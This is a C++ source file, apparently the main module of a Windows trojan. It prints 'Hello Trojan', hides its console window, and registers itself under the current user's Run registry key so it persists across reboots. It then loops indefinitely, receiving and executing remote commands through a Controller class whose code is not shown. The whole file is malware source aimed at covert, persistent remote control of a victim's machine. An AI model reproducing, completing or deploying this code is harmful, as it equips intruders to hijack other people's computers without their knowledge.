#include "Config.h"
#include "Global.h"
#include "Controller.h"

using namespace std;

char recvBuffer[BUFFER_SIZE];
vector<string> fileScanResult;
vector<string> directoryScanResult;

void HKRunator()   // 程序自启动 
{
	HKEY hKey;  //操作注册表的句柄

	   //找到系统的启动项位置 
	LPCTSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	//打开启动项Key  
	long lRet = RegOpenKeyEx(HKEY_CURRENT_USER, lpRun, 0, KEY_WRITE, &hKey);

	if (lRet == ERROR_SUCCESS)  //打开成功
	{
		char pFileName[MAX_PATH] = { 0 };  //定义存放路径
		//得到程序自身的全路径  
		DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH);
		//添加一个子Key,并设置值 // 下面的"test"是应用程序名字（不加后缀.exe） 
		lRet = RegSetValueEx(hKey, "SetAutoRun", 0, REG_SZ, (BYTE*)pFileName, dwRet);
		//关闭注册表  
		RegCloseKey(hKey);
		if (lRet != ERROR_SUCCESS)
		{
			printf("系统参数错误,不能完成开机启动设置\n");
		}
		else
		{
			printf("打开开机启动成功\n");
		}
		// isrun = 1; 
	}
}

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ShowConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

bool IsConsoleVisible()
{
	return ::IsWindowVisible(::GetConsoleWindow()) != FALSE;
}

int main()
{
	if (HIDE_CONSOLE)
	{
		HideConsole();
	}
	cout << "Hello Trojan: " << GetCurrentProcessId() << endl;
	if (AUTOSTART)
	{
		HKRunator();
	}
	char test1[30];
	char test2[30] = { 0 };
	while (1)
	{
		Controller ctrl;
		bool NORMAL = true;

		if (ctrl.initializeError)
		{
			cout << "initialize error: " << GetLastError() << endl;
		}
		else
		{
			while (NORMAL && ctrl.working)
			{
				NORMAL = ctrl.RecvCmd();
				if (NORMAL)
					NORMAL = ctrl.ExecCmd();
			}
			if (NORMAL)
			{
				cout << "[+] Successfully Quit. [+]" << endl;
			}
			else
			{
				cout << "[-] Error: " << GetLastError() << endl;
			}
		}
		ctrl.Close();
	}

	//ShowConsole();
	system("pause");
}